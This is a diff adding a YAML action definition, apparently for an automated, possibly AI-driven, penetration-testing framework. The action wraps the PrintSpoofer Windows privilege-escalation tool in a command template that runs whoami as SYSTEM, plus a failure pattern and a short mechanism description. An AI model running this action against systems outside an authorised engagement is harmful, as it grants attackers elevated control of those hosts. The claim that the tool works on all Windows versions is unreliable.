@@ -1,0 +1,16 @@
+name: printspoofer
+category: privesc
+description: PrintSpoofer privilege escalation
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "PrintSpoofer64.exe -i -c 'cmd /c whoami'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Exploits Windows pipe impersonation via Print Spooler service. Works on all Windows versions. Requires SeImpersonatePrivilege. Simpler than JuicyPotato."
